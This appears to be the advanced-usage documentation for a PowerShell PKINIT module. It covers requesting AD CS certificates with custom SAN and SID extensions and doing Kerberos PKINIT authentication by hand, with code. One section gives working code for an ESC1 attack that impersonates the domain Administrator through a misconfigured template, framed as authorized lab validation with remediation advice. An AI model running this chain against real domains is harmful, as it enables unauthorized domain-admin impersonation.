# Advanced Usage

## Requesting a certificate with a custom SAN, then authenticating as it

`New-PkinitCertificateRequest` and `Invoke-PkinitAuthentication` are designed
to chain directly: request a certificate carrying whatever SAN you want to
test, then authenticate as that exact identity.

```powershell
Import-Module .\PSPkinit.psd1

$certParams = @{
    Subject              = 'CN=Test User'
    San                  = 'user@adcs.goat'
    SanType              = 'UserPrincipalName'
    Template             = 'UserWithSAN'
    CertificateAuthority = 'ADCSGoat-CA.adcs.goat\LabRootCA1'
}
$req = New-PkinitCertificateRequest @certParams

$authParams = @{
    Certificate = $req.Certificate
    ClientName  = $req.San
    Realm       = 'ADCS.GOAT'
    KdcHostname = 'ADCSGoat-DC.adcs.goat'
}
Invoke-PkinitAuthentication @authParams
```

`-SanType` also accepts `Dns` and `Email`; `UserPrincipalName` (the default)
is what Windows/PKINIT strong certificate mapping actually looks at. See
`Get-Help New-PkinitCertificateRequest -Full` for every parameter - and the
[Requirements](../README.md#requirements) section for the one
template-configuration prerequisite (enrollee-supplied SAN) this depends on.

### If the CA/template doesn't add the SID security extension itself

If a template has `NO_SECURITY_EXTENSION` set (or the CA otherwise won't add
the SID security extension automatically), a KDC in Full Enforcement mode
will reject the resulting certificate for PKINIT no matter how correct
everything else is - this was the root cause of an entire earlier debugging
session against this project's own lab CA. `-Sid` embeds that extension
(OID `1.3.6.1.4.1.311.25.2`) directly on the CSR yourself. Look up the SID
for the account you're testing as (no `ActiveDirectory` module/RSAT needed):

```powershell
$sid = ([System.Security.Principal.NTAccount]'ADCS\user').Translate([System.Security.Principal.SecurityIdentifier]).Value

$certParams = @{
    Subject              = 'CN=Test User'
    San                  = 'user@adcs.goat'
    SanType              = 'UserPrincipalName'
    Sid                  = $sid
    Template             = 'UserWithSAN'
    CertificateAuthority = 'ADCSGoat-CA.adcs.goat\LabRootCA1'
}
$req = New-PkinitCertificateRequest @certParams

$authParams = @{
    Certificate = $req.Certificate
    ClientName  = $req.San
    Realm       = 'ADCS.GOAT'
    KdcHostname = 'ADCSGoat-DC.adcs.goat'
}
Invoke-PkinitAuthentication @authParams
```

This only works if the CA doesn't strip a client-supplied extension with this
OID (most don't, by default). **Only ever supply the SID of an identity you
are authorized to test as.** A CA/template that honors an arbitrary
client-supplied SID here - especially combined with an arbitrary
client-supplied SAN - is the same primitive used by real certificate
SID-spoofing/impersonation techniques (see e.g.
[GhostPack/Certify](https://github.com/GhostPack/Certify)'s `--sid` option,
which is compiled out of its release builds by default for this reason).
This is not a way to authenticate as an identity you don't already control.

## Security research: validating ESC1 (enrollee-supplied SAN + SID bypass)

If a template allows a low-privileged principal to enroll AND supply both an
arbitrary SAN and an arbitrary SID (as above), that principal can obtain a
fully-authenticating certificate for *any* identity - a well-known AD CS
misconfiguration class ([SpecterOps' "Certified Pre-Owned"](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
calls this ESC1). In an authorized lab you own/administer, this module can
demonstrate the full chain end-to-end, enrolling as a low-privileged account
but requesting an identity you do not otherwise control:

```powershell
# Enrolled as a low-privileged account; requests and authenticates as a
# completely different, high-privileged identity - only ever do this against
# infrastructure you own and are authorized to test.
$adminSid = ([System.Security.Principal.NTAccount]'ADCS\Administrator').Translate([System.Security.Principal.SecurityIdentifier]).Value

$certParams = @{
    Subject              = 'CN=Test Admin Impersonation'
    San                  = 'administrator@adcs.goat'
    SanType              = 'UserPrincipalName'
    Sid                  = $adminSid
    Template             = 'UserWithSAN'
    CertificateAuthority = 'ADCSGoat-CA.adcs.goat\LabRootCA1'
}
$req = New-PkinitCertificateRequest @certParams

$authParams = @{
    Certificate = $req.Certificate
    ClientName  = $req.San
    Realm       = 'ADCS.GOAT'
    KdcHostname = 'ADCSGoat-DC.adcs.goat'
}
Invoke-PkinitAuthentication @authParams
```

A successful run here is a finding, not a feature to rely on operationally -
it means the template needs its `ENROLLEE_SUPPLIES_SUBJECT` and enrollment
rights locked down (restrict to the identities that should actually get
certs for themselves, and/or add manager approval / authorized-signature
requirements).

## Doing it by hand

`Invoke-PkinitAuthentication` is just a thin wrapper around the `Private/`
functions - useful if you want to inspect/modify an intermediate value (e.g.
the raw AS-REQ bytes, or the DH keypair) instead of only seeing the final
result. Dot-source the private files directly, in this order (each depends
only on the ones before it):

```powershell
$root = '.'
. "$root\Private\Asn1.ps1"
. "$root\Private\KerberosCrypto.ps1"
. "$root\Private\PkinitMessages.ps1"
. "$root\Private\Pkinit.ps1"

$cert = Get-ChildItem Cert:\CurrentUser\My |
    Where-Object Thumbprint -eq '<YOUR_CERT_THUMBPRINT>'

# NT-ENTERPRISE (10) + a full UPN is the reliable combination against AD; a
# bare sAMAccountName with NT-PRINCIPAL (1, the default) often resolves to
# KDC_ERR_C_PRINCIPAL_UNKNOWN.
$nonce = [uint32](Get-Random -Minimum 1 -Maximum ([int]::MaxValue))
$body  = New-KdcReqBody -ClientName 'user@your.realm' -ClientNameType 10 -Realm 'YOUR.REALM' -Nonce $nonce

$dh        = New-PkinitDiffieHellmanKeyPair
$authPack  = New-PkinitAuthPack -KdcReqBody $body -Nonce $nonce -DhKeyPair $dh
$signed    = New-PkinitSignedAuthPack -AuthPack $authPack -Certificate $cert
$paData    = New-PkinitPaData -SignedAuthPack $signed
$asReq     = New-AsReq -KdcReqBody $body -PaData @($paData)

$response = Send-KerberosTcpMessage -KdcHostname 'your-kdc.your.realm' -Message $asReq

if ($response[0] -eq 0x7e) {
    # KRB-ERROR - inspect ErrorCode/ErrorText before going further.
    ConvertFrom-KrbError -Message $response
    return
}

$asRep         = ConvertFrom-KdcRep -Message $response -ExpectedApplicationTag 11
$pkAsRepPaData = $asRep.PaData | Where-Object Type -eq 17
$dhRepInfo     = ConvertFrom-PkinitDhRepInfo -PaDataValue $pkAsRepPaData.Value
$kdcDhKeyInfo  = ConvertFrom-PkinitKdcDhKeyInfo -DhSignedData $dhRepInfo.DhSignedData

if ($kdcDhKeyInfo.Nonce -ne $nonce) {
    throw 'Nonce mismatch - possible replay or tampering.'
}

$sharedSecretParams = @{
    TheirPublicValue   = $kdcDhKeyInfo.ServerPublicValue
    OurPrivateExponent = $dh.PrivateExponent
    P                  = $dh.P
    ModulusByteLength  = $dh.ModulusByteLength
}
$sharedSecret = Get-PkinitDiffieHellmanSharedSecret @sharedSecretParams

# etype 18 = aes256-cts-hmac-sha1-96 (32-byte key), 17 = aes128 (16-byte key).
$keyByteLength = switch ($asRep.EncPart.EType) {
    18 { 32 }
    17 { 16 }
    default { throw "Unsupported enctype $($asRep.EncPart.EType)" }
}
$replyKey  = ConvertTo-OctetString2Key -InputBytes $sharedSecret -KeyByteLength $keyByteLength
$decrypted = Unprotect-KerberosData -BaseKey $replyKey -KeyUsage 3 -Ciphertext $asRep.EncPart.Cipher
$encPart   = ConvertFrom-EncKdcRepPart -Message $decrypted -ExpectedApplicationTag 25

[PSCustomObject]@{
    CName          = $asRep.CName.NameStrings -join '/'
    SName          = $encPart.SName.NameStrings -join '/'
    AuthTime       = $encPart.AuthTime
    EndTime        = $encPart.EndTime
    FlagsHex       = '0x{0:X8}' -f $encPart.Flags
    SessionKeyType = $encPart.Key.KeyType
}
```
